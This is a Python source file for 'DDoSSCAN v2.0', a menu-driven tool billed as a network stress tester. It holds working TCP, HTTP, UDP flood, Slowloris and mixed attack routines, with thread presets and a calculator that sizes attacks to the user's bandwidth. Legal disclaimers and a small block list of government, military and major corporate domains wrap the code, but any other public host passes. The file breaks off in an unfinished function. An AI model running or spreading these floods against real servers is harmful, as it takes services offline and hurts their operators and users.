#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoSSCAN v2.0 — Network Availability & Stress Testing Tool
Author  : ruyynn
GitHub  : https://github.com/ruyynn/DDoSSCAN

DISCLAIMER:
  This tool is built for educational purposes, security research, and
  authorized network testing on systems you own or have written permission.
  Unauthorized use is ILLEGAL.
  Author is not responsible for any misuse of this tool.
"""

import os, sys, time, socket, threading, random, json, re, ssl, struct
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from typing import Optional

# ==================== COLOR ====================
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'
        MAGENTA='\033[35m'; CYAN='\033[36m'; WHITE='\033[37m'; RESET='\033[0m'
        LIGHTWHITE_EX='\033[97m'; LIGHTRED_EX='\033[91m'; LIGHTGREEN_EX='\033[92m'
        LIGHTCYAN_EX='\033[96m'
    class Style:
        BRIGHT='\033[1m'; DIM='\033[2m'; RESET_ALL='\033[0m'

# ==================== BOX ENGINE ====================
ANSI = re.compile(r'\033\[[0-9;]*m')
W    = 72

def _vl(s): return len(ANSI.sub('', s))

def _row(c):
    pad = W - 2 - _vl(c)
    if pad < 0: pad = 0
    print(f"{Fore.CYAN}║{Style.RESET_ALL}{c}{' '*pad}{Fore.CYAN}║{Style.RESET_ALL}")

def box_top(t=""):
    inner = W - 2
    print(f"{Fore.CYAN}╔{'═'*inner}╗{Style.RESET_ALL}")
    if t:
        p = inner - len(t); l = p//2; r = p-l
        print(f"{Fore.CYAN}║{' '*l}{Fore.YELLOW}{Style.BRIGHT}{t}{Style.RESET_ALL}{Fore.CYAN}{' '*r}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╠{'═'*inner}╣{Style.RESET_ALL}")

def box_div(): print(f"{Fore.CYAN}╠{'═'*(W-2)}╣{Style.RESET_ALL}")
def box_bot(): print(f"{Fore.CYAN}╚{'═'*(W-2)}╝{Style.RESET_ALL}")
def box_emp(): _row(" ")

def box_item(n, icon, label, detail="", new=False, ex=False):
    nc = Fore.RED   if ex  else Fore.GREEN
    nw = f" {Fore.MAGENTA}[NEW]{Style.RESET_ALL}" if new else ""
    dt = f"  {Style.DIM}{detail}{Style.RESET_ALL}"  if detail else ""
    ic = f"{icon}  " if icon else "   "
    _row(f" {nc}[{n}]{Style.RESET_ALL}  {ic}{Fore.LIGHTWHITE_EX}{label}{Style.RESET_ALL}{nw}{dt}")

def box_kv(k, v, vc=None):
    vc = vc or Fore.YELLOW
    _row(f"  {Fore.CYAN}{k}{Style.RESET_ALL}  {vc}{v}{Style.RESET_ALL}")

def box_status(status, version, blocker, session):
    _row(f"  {Style.DIM}Status:{Style.RESET_ALL} {Fore.GREEN}{status}{Style.RESET_ALL}"
         f"  {Style.DIM}v{Style.RESET_ALL}{Fore.YELLOW}{version}{Style.RESET_ALL}"
         f"  {Style.DIM}Blocker:{Style.RESET_ALL} {Fore.GREEN}{blocker}{Style.RESET_ALL}"
         f"  {Style.DIM}Session:{Style.RESET_ALL} {Fore.CYAN}{session}{Style.RESET_ALL}")

# ==================== LOGO ====================
LOGO = (
    f"\n{Fore.CYAN}{Style.BRIGHT}"
    "  ██████╗ ██████╗  ██████╗ ███████╗███████╗ ██████╗ █████╗ ███╗   ██╗\n"
    "  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔════╝██╔══██╗████╗  ██║\n"
    "  ██║  ██║██║  ██║██║   ██║███████╗███████╗██║     ███████║██╔██╗ ██║\n"
    "  ██║  ██║██║  ██║██║   ██║╚════██║╚════██║██║     ██╔══██║██║╚██╗██║\n"
    "  ██████╔╝██████╔╝╚██████╔╝███████║███████║╚██████╗██║  ██║██║ ╚████║\n"
    "  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝\n"
    f"{Style.RESET_ALL}"
    f"{Fore.CYAN}  {'─'*68}{Style.RESET_ALL}\n"
    f"{Style.DIM}  Network Availability & Stress Testing Tool  v2.0  by ruyynn{Style.RESET_ALL}\n"
    f"{Style.DIM}  github.com/ruyynn/DDoSSCAN{Style.RESET_ALL}\n"
)

# ==================== DOMAIN BLOCKER ====================
class DomainBlocker:
    """
    Blocks targets that are not allowed to be tested without explicit permission.
    Domain list is loaded from blocked_domains.json (separate file).
    Falls back to a built-in minimal list if the config file is not found.
    """

    _CONFIG_FILE = "blocked_domains.json"
    _loaded      = False

    # Fallback minimal jika config file tidak ada
    GOV_TLDS        = {'.gov', '.mil', '.go.id', '.gov.uk', '.gov.au'}
    MIL_KEYWORDS    = {'military', 'army', 'navy', 'tni', 'polri', 'pentagon', 'nato'}
    GOV_KEYWORDS    = {'government', 'kominfo', 'kpu', 'dpr', 'senate', 'congress'}
    BLOCKED_DOMAINS = {'google.com', 'facebook.com', 'amazon.com', 'microsoft.com',
                       'bca.co.id', 'mandiri.co.id', 'bni.co.id', 'bri.co.id'}

    @classmethod
    def _load(cls):
        """Load blocked list from external config file."""
        if cls._loaded:
            return
        try:
            cfg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    cls._CONFIG_FILE)
            if not os.path.exists(cfg_path):
                cfg_path = cls._CONFIG_FILE
            with open(cfg_path, 'r') as f:
                cfg = json.load(f)
            cls.GOV_TLDS        = set(cfg.get('blocked_tlds', []))
            cls.MIL_KEYWORDS    = set(cfg.get('blocked_keywords_military', []))
            cls.GOV_KEYWORDS    = set(cfg.get('blocked_keywords_government', []))
            cls.BLOCKED_DOMAINS = set(cfg.get('blocked_domains', []))
        except Exception:
            pass
        finally:
            cls._loaded = True

    @staticmethod
    def is_private_ip(ip: str) -> bool:
        try:
            import ipaddress
            return ipaddress.ip_address(ip).is_private
        except:
            return False

    @classmethod
    def check(cls, target: str) -> tuple[bool, str]:
        """
        Returns (is_blocked: bool, reason: str)
        True = blocked, False = allowed
        """
        cls._load()  # load dari blocked_domains.json
        t = target.lower().strip()
        # Strip protocol
        for prefix in ('https://', 'http://', 'ftp://'):
            if t.startswith(prefix): t = t[len(prefix):]
        t = t.split('/')[0].split(':')[0]

        # 1. Check government TLD
        for tld in cls.GOV_TLDS:
            if t.endswith(tld):
                return True, f"Government domain detected ({tld})"

        # 2. Check military keyword
        for kw in cls.MIL_KEYWORDS:
            if kw in t:
                return True, f"Military domain detected ('{kw}')"

        # 3. Check government keyword
        for kw in cls.GOV_KEYWORDS:
            if kw in t:
                return True, f"Government domain detected ('{kw}')"

        # 4. Check explicit blocked domain list
        for bd in cls.BLOCKED_DOMAINS:
            if t == bd or t.endswith('.' + bd):
                return True, f"Critical infrastructure domain ({bd})"

        # 5. Resolve dan cek IP jika input domain
        try:
            ip = socket.gethostbyname(t)
            blocked_ip, reason = cls.check_ip(ip)
            if blocked_ip:
                return True, reason
        except:
            pass

        return False, ""

    @classmethod
    def check_ip(cls, ip: str) -> tuple[bool, str]:
        """Check if IP is blocked"""
        try:
            import ipaddress
            addr = ipaddress.ip_address(ip)

            # Loopback diizinkan (localhost testing)
            if addr.is_loopback:
                return False, ""

            # Private range — izinkan (LAN testing)
            if addr.is_private:
                return False, ""

            # Multicast / reserved
            if addr.is_multicast:
                return True, "Multicast IP not allowed"
            if addr.is_reserved:
                return True, "Reserved IP not allowed"

        except:
            pass
        return False, ""

    @classmethod
    def safety_check(cls, target: str) -> dict:
        """Run full safety check and return report"""
        blocked, reason = cls.check(target)
        t = target.lower().strip()

        # Resolve IP
        ip = None
        try:
            ip = socket.gethostbyname(t.split('/')[0].split(':')[0])
        except:
            pass

        return {
            'target':   target,
            'ip':       ip or 'unresolved',
            'blocked':  blocked,
            'reason':   reason,
            'safe':     not blocked,
            'checked':  datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }

# ==================== SESSION ====================
class Session:
    def __init__(self):
        self.id      = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.start   = datetime.now()
        self.results = []

    def uptime(self):
        d = datetime.now() - self.start
        m, s = divmod(int(d.total_seconds()), 60)
        return f"{m:02d}:{s:02d}"

    def save(self, data: dict):
        self.results.append(data)

S = Session()

# ==================== HELPERS ====================
def clr():  os.system('cls' if os.name == 'nt' else 'clear')
def pause(): input(f"\n  {Style.DIM}[Enter] to continue...{Style.RESET_ALL}")
def hdr(t):  clr(); print(LOGO); box_top(t)

def ok(m):   print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} {m}")
def err(m):  print(f"  {Fore.RED}[-]{Style.RESET_ALL} {m}")
def info(m): print(f"  {Fore.CYAN}[*]{Style.RESET_ALL} {m}")
def warn(m): print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} {m}")
def hit(m):  print(f"  {Fore.MAGENTA}[★]{Style.RESET_ALL} {Fore.GREEN}{Style.BRIGHT}{m}{Style.RESET_ALL}")
def blocked_msg(reason):
    print(f"\n  {Fore.RED}{Style.BRIGHT}╔{'═'*58}╗{Style.RESET_ALL}")
    print(f"  {Fore.RED}{Style.BRIGHT}║  🚫  TARGET BLOCKED{' '*37}║{Style.RESET_ALL}")
    print(f"  {Fore.RED}{Style.BRIGHT}╠{'═'*58}╣{Style.RESET_ALL}")
    print(f"  {Fore.RED}║  Reason : {reason:<47}║{Style.RESET_ALL}")
    print(f"  {Fore.RED}║  Status : Target is not authorized for testing    ║{Style.RESET_ALL}")
    print(f"  {Fore.RED}{Style.BRIGHT}╚{'═'*58}╝{Style.RESET_ALL}")

def prompt(ctx="main"):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"\n{Fore.CYAN}  ┌─[{Fore.YELLOW}DDoSSCAN{Fore.CYAN}@{Fore.MAGENTA}{ctx}{Fore.CYAN}]─[{Style.DIM}{ts}{Style.RESET_ALL}{Fore.CYAN}]{Style.RESET_ALL}")
    return input(f"{Fore.CYAN}  └──╼{Style.RESET_ALL} $ ").strip()

def inp(label, default=""):
    d = f" ({default})" if default else ""
    return input(f"  {Fore.YELLOW}{label}{d}{Style.RESET_ALL}: ").strip() or default

# ==================== SPINNER ====================
class Spin:
    F = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    def __init__(self, msg):
        self.msg=msg; self._ev=threading.Event()
        self._t=threading.Thread(target=self._run, daemon=True)
    def _run(self):
        i=0
        while not self._ev.is_set():
            sys.stdout.write(f"\r  {Fore.CYAN}{self.F[i%len(self.F)]}{Style.RESET_ALL}  {self.msg}  ")
            sys.stdout.flush(); time.sleep(0.08); i+=1
    def start(self): self._t.start(); return self
    def stop(self, done=""):
        self._ev.set(); self._t.join()
        sys.stdout.write(f"\r  {Fore.GREEN}[+]{Style.RESET_ALL}  {done or self.msg}\n")
        sys.stdout.flush()

# ==================== BOOT ====================
def boot():
    clr(); print(LOGO)
    stages = [
        "  Initializing stress test engine    ",
        "  Loading domain safety blocker      ",
        "  Configuring attack vectors         ",
        "  Starting session tracker           ",
        "  DDoSSCAN v2.0 ready                ",
    ]
    colors = [Fore.CYAN, Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN]
    for color, stage in zip(colors, stages):
        for j in range(21):
            bar = "█"*j + "░"*(20-j)
            sys.stdout.write(f"\r{color}{stage}  [{bar}] {j*5:3d}%{Style.RESET_ALL}")
            sys.stdout.flush(); time.sleep(0.015)
        print(f"\r{color}{stage}  [{'█'*20}] 100%  {Fore.GREEN}✔{Style.RESET_ALL}")
    print()
    print(f"{Fore.GREEN}{Style.BRIGHT}  ╔{'═'*62}╗")
    print(f"  ║   DDoSSCAN v2.0  —  armed and ready  (Domain Blocker: ON){' '*3}║")
    print(f"  ╚{'═'*62}╝{Style.RESET_ALL}")
    time.sleep(1.0)

# ==================== ATTACK METHODS ====================
class AttackEngine:
    def __init__(self, target_ip, target_port, method, lock):
        self.ip     = target_ip
        self.port   = target_port
        self.method = method
        self.lock   = lock
        self.running = False
        self.packets = 0
        self.success = 0
        self.errors  = 0
        self._user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "curl/7.68.0", "python-requests/2.31.0",
        ]

    def _count(self, success=False):
        with self.lock:
            self.packets += 1
            if success: self.success += 1
            else: self.errors += 1

    def tcp_flood(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2); s.connect((self.ip, self.port))
                s.send(os.urandom(random.randint(512, 1400)))
                for _ in range(random.randint(3, 10)):
                    if not self.running: break
                    s.send(os.urandom(random.randint(64, 512)))
                    time.sleep(0.05)
                s.close(); self._count(True)
            except: self._count()
            time.sleep(random.uniform(0.01, 0.05))

    def http_flood(self):
        paths = ['/', '/index.html', '/api/status', '/ping', '/health']
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                if self.port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.ip)
                s.connect((self.ip, self.port))
                for _ in range(random.randint(5, 20)):
                    if not self.running: break
                    path = random.choice(paths)
                    ua   = random.choice(self._user_agents)
                    req  = (f"GET {path} HTTP/1.1\r\nHost: {self.ip}\r\n"
                            f"User-Agent: {ua}\r\nConnection: keep-alive\r\n"
                            "Cache-Control: no-cache\r\n\r\n")
                    s.send(req.encode()); self._count(True)
                    time.sleep(random.uniform(0.01, 0.08))
                s.close()
            except: self._count()
            time.sleep(0.03)

    def udp_flood(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(random.randint(10, 50)):
                    if not self.running: break
                    s.sendto(os.urandom(random.randint(512, 1400)), (self.ip, self.port))
                    self._count(True)
                s.close()
            except: self._count()
            time.sleep(0.005)

    def slowloris(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4); s.connect((self.ip, self.port))
                s.send(f"GET /{random.randint(1,9999)} HTTP/1.1\r\n"
                       f"Host: {self.ip}\r\nContent-Length: 42\r\n".encode())
                self._count(True)
                for _ in range(60):
                    if not self.running: break
                    try:
                        s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                        time.sleep(random.uniform(8, 20))
                    except: break
                s.close()
            except: self._count()
            time.sleep(0.1)

    def mixed(self):
        fns = [self.tcp_flood, self.http_flood, self.udp_flood]
        while self.running:
            fn = random.choice(fns)
            try: fn()
            except: pass

    def get_fn(self):
        return {'tcp': self.tcp_flood, 'http': self.http_flood,
                'udp': self.udp_flood, 'slowloris': self.slowloris,
                'mixed': self.mixed}.get(self.method, self.http_flood)

# ==================== SMART CALCULATOR ====================
class SmartCalc:
    PRESETS = {
        '1': {'name': 'Web Server (Apache/Nginx)',   'threads': 500,  'dur': 120, 'method': 'http'},
        '2': {'name': 'Game Server (UDP)',            'threads': 800,  'dur': 90,  'method': 'udp'},
        '3': {'name': 'API Server (REST)',            'threads': 400,  'dur': 150, 'method': 'http'},
        '4': {'name': 'TCP Service',                  'threads': 600,  'dur': 120, 'method': 'tcp'},
        '5': {'name': 'Connection Limit Test',        'threads': 300,  'dur': 180, 'method': 'slowloris'},
        '6': {'name': 'Mixed Stress Test',            'threads': 700,  'dur': 120, 'method': 'mixed'},
    }

    @staticmethod
    def calc(bandwidth_mbps: float, max_threads: int) -> dict:
        threads  = min(int(bandwidth_mbps * 8), max_threads, 2000)
        dur      = max(60, min(600, int(50000 / max(threads, 1))))
        est_req  = threads * dur * 0.75
        est_bw   = min(bandwidth_mbps, threads * 0.015)
        return {'threads': threads, 'duration': dur,
                'est_requests': est_req, 'est_bandwidth': est_bw}

# ==================== REPORT GENERATOR ====================
class Reporter:
    @staticmethod
    def save_json(data: dict) -> str:
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn  = f"ddosscan_report_{ts}.json"
        with open(fn, 'w') as f: json.dump(data, f, indent=2)
        return fn

    @staticmethod
    def save_txt(data: dict) -> str:
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn  = f"ddosscan_report_{ts}.txt"
        lines = [
            "="*60,
            "  DDoSSCAN v2.0  —  Stress Test Report",
            "="*60,
            f"  Session    : {data.get('session','')}",
            f"  Date       : {data.get('timestamp','')}",
            f"  Target     : {data.get('target','')}:{data.get('port','')}",
            f"  Method     : {data.get('method','').upper()}",
            f"  Threads    : {data.get('threads','')}",
            f"  Duration   : {data.get('duration_sec','')}s",
            "="*60,
            "  RESULTS",
            "-"*60,
            f"  Total Packets    : {data.get('packets',0):,}",
            f"  Successful       : {data.get('success',0):,}",
            f"  Errors           : {data.get('errors',0):,}",
            f"  Avg Rate         : {data.get('avg_rate',0):.1f} pkt/s",
            f"  Est. Bandwidth   : {data.get('est_bw',0):.2f} Mbps",
            f"  Success Rate     : {data.get('success_rate',0):.1f}%",
            "="*60,
            "  DDoSSCAN v2.0  github.com/ruyynn/DDoSSCAN",
            "="*60,
        ]
        with open(fn, 'w') as f: f.write("\n".join(lines))
        return fn

# ==================== MAIN SUITE ====================
class DDoSSCAN:
    def __init__(self):
        self.target     = ""
        self.port       = 80
        self.threads    = 500
        self.duration   = 120
        self.method     = "http"
        self.last_result: Optional[dict] = None

    # ── status bar ─────────────────────────────────────────
    def _sb(self):
        box_div()
        box_status("READY", "2.0.0", "ON", S.id)
        box_bot()

    # ── safety gate ─────────────────────────────────────────
    def _safe(self, target: str) -> bool:
        sp = Spin("Checking target safety...").start()
        r  = DomainBlocker.safety_check(target)
        sp.stop("Check complete")
        print()
        if r['blocked']:
            blocked_msg(r['reason'])
            print()
            warn("Use only targets you own or have explicit written permission to test.")
            pause()
            return False
        ok(f"Target {Fore.YELLOW}{target}{Style.RESET_ALL} is authorized for testing")
        ok(f"Resolved IP: {Fore.CYAN}{r['ip']}{Style.RESET_ALL}")
        return True

    # ── MAIN MENU ────────────────────────────────────────────
    def main(self):
        while True:
            clr(); print(LOGO)
            box_top("MAIN MENU  —  DDoSSCAN v2.0")
            box_emp()
            box_item("1","🎯","Target Preset",      "WebServer  GameServer  API  Custom")
            box_item("2","⚡","Quick Attack",        "Quick launch with minimal parameters")
            box_item("3","🧮","Smart Calculator",    "Calculate optimal parameters",True)
            box_item("4","📊","Live Monitor",        "Dashboard real-time stats",True)
            box_item("5","🛡","Domain Safety Check", "Verify target is allowed",True)
            box_item("6","📋","Report Generator",    "Export results to TXT / JSON",True)
            box_item("7","📖","Usage Guide",         "Panduan & rekomendasi")
            box_item("8","🔧","Maintenance",         "About  Disclaimer  Session")
            box_emp()
            box_item("0","","Exit","",False,True)
            box_emp(); self._sb()
            try:
                ch = prompt("main")
                d = {'1':self._preset,'2':self._quick,'3':self._calculator,
                     '4':self._monitor,'5':self._safety_check,'6':self._report,
                     '7':self._guide,'8':self._maint}
                if   ch == '0':
                    print(f"\n{Fore.YELLOW}  DDoSSCAN v2.0  github.com/ruyynn{Style.RESET_ALL}\n"); sys.exit(0)
                elif ch in d: d[ch]()
                else: warn("Invalid choice"); time.sleep(0.7)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}  [Ctrl+C]  Press again to exit{Style.RESET_ALL}"); time.sleep(0.9)

    # ── 1 TARGET PRESET ──────────────────────────────────────
    def _preset(self):
        while True:
            hdr("TARGET PRESET")
            box_emp()
            for k, v in SmartCalc.PRESETS.items():
                box_item(k,"",v['name'],
                         f"threads={v['threads']}  dur={v['dur']}s  {v['method'].upper()}")
            box_emp()
            box_item("0","","← Back","",False,True)
            box_emp(); self._sb()
            ch = prompt("preset")
            if ch == '0': break
            if ch in SmartCalc.PRESETS:
                p = SmartCalc.PRESETS[ch]
                hdr(f"PRESET: {p['name'].upper()}")
                box_emp(); box_bot()
                self.threads  = p['threads']
                self.duration = p['dur']
                self.method   = p['method']
                self.target = inp("Target IP / hostname")
                if not self.target: continue
                self.port = int(inp("Port", "80"))
                if self._safe(self.target):
                    self._confirm_and_run()
                break

    # ── 2 QUICK ATTACK ───────────────────────────────────────
    def _quick(self):
        hdr("QUICK ATTACK"); box_emp(); box_bot()
        self.target = inp("Target IP / hostname")
        if not self.target: return
        self.port     = int(inp("Port", "80"))
        self.threads  = int(inp("Threads", "300"))
        self.duration = int(inp("Duration (seconds)", "60"))
        print(f"\n  {Style.DIM}Method:{Style.RESET_ALL}")
        for k, v in [("1","TCP"),("2","HTTP"),("3","UDP"),("4","Slowloris"),("5","Mixed")]:
            print(f"  {Fore.GREEN}[{k}]{Style.RESET_ALL}  {v}")
        mc = inp("\nMethod", "2")
        self.method = {'1':'tcp','2':'http','3':'udp','4':'slowloris','5':'mixed'}.get(mc,'http')
        if self._safe(self.target):
            self._confirm_and_run()

    # ── 3 SMART CALCULATOR ───────────────────────────────────
    def _calculator(self):
        hdr("SMART CALCULATOR"); box_emp(); box_bot()
        bw  = float(inp("Your bandwidth (Mbps)", "50"))
        mt  = int(inp("Max threads", "1000"))
        r   = SmartCalc.calc(bw, mt)
        print()
        ok(f"Recommended threads  : {Fore.YELLOW}{r['threads']}{Style.RESET_ALL}")
        ok(f"Recommended duration : {Fore.YELLOW}{r['duration']}s{Style.RESET_ALL}")
        ok(f"Est. requests        : {Fore.YELLOW}{r['est_requests']:,.0f}{Style.RESET_ALL}")
        ok(f"Est. bandwidth used  : {Fore.YELLOW}{r['est_bandwidth']:.1f} Mbps{Style.RESET_ALL}")
        print()
        use = inp("Use these parameters? (y/n)", "y")
        if use.lower() == 'y':
            self.threads  = r['threads']
            self.duration = r['duration']
            self.target   = inp("Target IP / hostname")
            if not self.target: return
            self.port   = int(inp("Port", "80"))
            self.method = inp("Method [tcp/http/udp/slowloris/mixed]", "http")
            if self._safe(self.target):
                self._confirm_and_run()
        pause()

    # ── 4 LIVE MONITOR ───────────────────────────────────────
    def _monitor(self):
        if not self.last_result:
            hdr("LIVE MONITOR"); box_emp(); box_bot()
            warn("No test session has been run yet.")
            info("Run a test first from menu 1, 2, or 3.")
            pause(); return
        r = self.last_result
        hdr("LIVE MONITOR — LAST SESSION"); box_emp(); box_bot()
        print()
        ok(f"Target       : {r.get('target')}:{r.get('port')}")
        ok(f"Method       : {r.get('method','').upper()}")
        ok(f"Threads      : {r.get('threads')}")
        ok(f"Duration     : {r.get('duration_sec')}s")
        print()
        hit(f"Total Packets   : {r.get('packets',0):,}")
        hit(f"Successful      : {r.get('success',0):,}")
        ok(f"Errors          : {r.get('errors',0):,}")
        ok(f"Avg Rate        : {r.get('avg_rate',0):.1f} pkt/s")
        ok(f"Est. Bandwidth  : {r.get('est_bw',0):.2f} Mbps")
        ok(f"Success Rate    : {r.get('success_rate',0):.1f}%")

        # Rating
        sr = r.get('success_rate', 0)
        if sr > 75:   rating = f"{Fore.GREEN}★★★★★ EXCELLENT{Style.RESET_ALL}"
        elif sr > 50: rating = f"{Fore.YELLOW}★★★☆☆ GOOD{Style.RESET_ALL}"
        elif sr > 25: rating = f"{Fore.MAGENTA}★★☆☆☆ FAIR{Style.RESET_ALL}"
        else:         rating = f"{Fore.RED}★☆☆☆☆ LOW{Style.RESET_ALL}"
        print(f"\n  {Fore.CYAN}Rating  :{Style.RESET_ALL}  {rating}")
        pause()

    # ── 5 DOMAIN SAFETY CHECK ────────────────────────────────
    def _safety_check(self):
        hdr("DOMAIN SAFETY CHECK"); box_emp(); box_bot()
        target = inp("Target domain / IP to check")
        if not target: return
        print()
        sp = Spin(f"Memeriksa {target}...").start()
        r  = DomainBlocker.safety_check(target)
        sp.stop("Done")
        print()
        box_top("SAFETY CHECK RESULT")
        box_kv("Target",  r['target'])
        box_kv("IP",      r['ip'])
        box_kv("Status",  "🚫 BLOCKED" if r['blocked'] else "✅ ALLOWED",
               Fore.RED if r['blocked'] else Fore.GREEN)
        if r['reason']:
            box_kv("Reason",  r['reason'], Fore.RED)
        box_kv("Checked at", r['checked'])
        box_bot()
        pause()

    # ── 6 REPORT GENERATOR ───────────────────────────────────
    def _report(self):
        if not self.last_result:
            hdr("REPORT GENERATOR"); box_emp(); box_bot()
            warn("No data to export yet.")
            info("Run a test first."); pause(); return

        hdr("REPORT GENERATOR"); box_emp(); box_bot()
        print()
        box_item("1","","Export TXT")
        box_item("2","","Export JSON")
        box_item("3","","Export TXT + JSON")
        box_item("0","","← Back","",False,True)
        box_bot()
        ch = prompt("report")
        print()
        if ch in ('1','3'):
            f = Reporter.save_txt(self.last_result)
            ok(f"TXT saved: {Fore.YELLOW}{f}{Style.RESET_ALL}")
        if ch in ('2','3'):
            f = Reporter.save_json(self.last_result)
            ok(f"JSON saved: {Fore.YELLOW}{f}{Style.RESET_ALL}")
        pause()

    # ── 7 USAGE GUIDE ────────────────────────────────────────
    def _guide(self):
        hdr("USAGE GUIDE")
        box_emp()
        _row(f"  {Fore.YELLOW}{Style.BRIGHT}PERMITTED USE OF THIS TOOL:{Style.RESET_ALL}")
        box_emp()
        for line in [
            "  ✅  Load testing on servers you own",
            "  ✅  Stress testing your own VPS / cloud instances",
            "  ✅  Internal network capacity testing",
            "  ✅  Security research with written permission",
            "  ✅  CTF and lab environments",
        ]: _row(f"{Fore.GREEN}{line}{Style.RESET_ALL}")
        box_emp()
        _row(f"  {Fore.RED}{Style.BRIGHT}PROHIBITED USE:{Style.RESET_ALL}")
        box_emp()
        for line in [
            "  ❌  Attacking servers without authorization",
            "  ❌  Targeting government / military domains",
            "  ❌  Targeting critical infrastructure",
            "  ❌  Any form of illegal attack",
        ]: _row(f"{Fore.RED}{line}{Style.RESET_ALL}")
        box_emp()
        _row(f"  {Fore.YELLOW}{Style.BRIGHT}QUICK GUIDE:{Style.RESET_ALL}")
        box_emp()
        steps = [
            "1. Use [5] Domain Safety Check to verify the target",
            "2. Use [3] Smart Calculator for optimal parameters",
            "3. Pick [1] Target Preset based on server type",
            "4. Monitor results with [4] Live Monitor",
            "5. Export report with [6] Report Generator",
        ]
        for s in steps: _row(f"  {Fore.CYAN}{s}{Style.RESET_ALL}")
        box_emp()
        _row(f"  {Fore.YELLOW}Methods:{Style.RESET_ALL}")
        for m, d in [("HTTP ","Layer 7 — exhausts connection pool"),
                     ("TCP  ","Layer 4 — TCP connection flood"),
                     ("UDP  ","Layer 4 — high bandwidth UDP"),
                     ("Slow ","Slowloris — connection hold exhaustion"),
                     ("Mixed","Combination of all methods")]:
            _row(f"  {Fore.CYAN}{m}{Style.RESET_ALL}  {Style.DIM}{d}{Style.RESET_ALL}")
        box_emp(); self._sb()
        pause()

    # ── 8 MAINTENANCE ────────────────────────────────────────
    def _maint(self):
        while True:
            hdr("MAINTENANCE")
            box_emp()
            box_item("1","","About")
            box_item("2","","Disclaimer")
            box_item("3","","Session Info")
            box_item("4","","Clear Reports")
            box_item("0","","← Back","",False,True)
            box_emp(); self._sb()
            ch = prompt("maint")
            if ch=='0': break
            elif ch=='1': self._about()
            elif ch=='2': self._disclaimer()
            elif ch=='3': self._session_info()
            elif ch=='4': self._clear_reports()

    def _about(self):
        hdr("ABOUT"); box_emp(); box_bot()
        print(f"""
  {Fore.CYAN}{Style.BRIGHT}DDoSSCAN v2.0  —  Network Availability & Stress Testing Tool{Style.RESET_ALL}

  {Fore.CYAN}Author  :{Style.RESET_ALL}  ruyynn
  {Fore.CYAN}GitHub  :{Style.RESET_ALL}  https://github.com/ruyynn/DDoSSCAN
  {Fore.CYAN}Version :{Style.RESET_ALL}  2.0.0
  {Fore.CYAN}License :{Style.RESET_ALL}  CUSTOM - SEE LICENSE.txt FOR MORE DETAILS

  {Fore.YELLOW}New in v2.0:{Style.RESET_ALL}
  {Fore.GREEN}  [+]{Style.RESET_ALL}  Domain Safety Blocker (gov/mil/critical infrastructure)
  {Fore.GREEN}  [+]{Style.RESET_ALL}  VIP Terminal Interface
  {Fore.GREEN}  [+]{Style.RESET_ALL}  Smart Parameter Calculator
  {Fore.GREEN}  [+]{Style.RESET_ALL}  Live Monitor Dashboard
  {Fore.GREEN}  [+]{Style.RESET_ALL}  Report Generator (TXT + JSON)
  {Fore.GREEN}  [+]{Style.RESET_ALL}  Session Tracker
  {Fore.GREEN}  [+]{Style.RESET_ALL}  Animated Boot Sequence
  {Fore.GREEN}  [+]{Style.RESET_ALL}  Integrated Disclaimer & Safety Check
""")
        pause()

    def _disclaimer(self):
        hdr("DISCLAIMER & LEGAL NOTICE"); box_emp(); box_bot()
        print(f"""
  {Fore.RED}{Style.BRIGHT}⚠  READ BEFORE USING{Style.RESET_ALL}

  {Fore.LIGHTWHITE_EX}DDoSSCAN is built ONLY for:{Style.RESET_ALL}
    • Education and network security learning
    • Load testing on systems you own
    • Legitimate and authorized security research

  {Fore.RED}ILLEGAL USE:{Style.RESET_ALL}
    Attacking systems without written authorization is a
    CRIMINAL OFFENSE subject to penalties under:
    • UU ITE No. 11 / 2008 (Indonesia)
    • Computer Fraud and Abuse Act (USA)
    • Computer Misuse Act (UK)
    • Dan peraturan setara di negara lain

  {Fore.YELLOW}DOMAIN BLOCKER:{Style.RESET_ALL}
    This tool automatically blocks targets that are
    government domains (.gov, .go.id, .mil, etc.), military domains,
    and critical infrastructure. This is a safety feature, not
    a guarantee that all other targets are legal to test.

  {Fore.CYAN}RESPONSIBILITY:{Style.RESET_ALL}
    Author (ruyynn) is not responsible for any misuse.
    Users are solely responsible for how they use this tool.
""")
        pause()

    def _session_info(self):
        hdr("SESSION INFO"); box_emp(); box_bot()
        print()
        ok(f"Session ID  : {S.id}")
        ok(f"Uptime      : {S.uptime()}")
        ok(f"Tests run   : {len(S.results)}")
        pause()

    def _clear_reports(self):
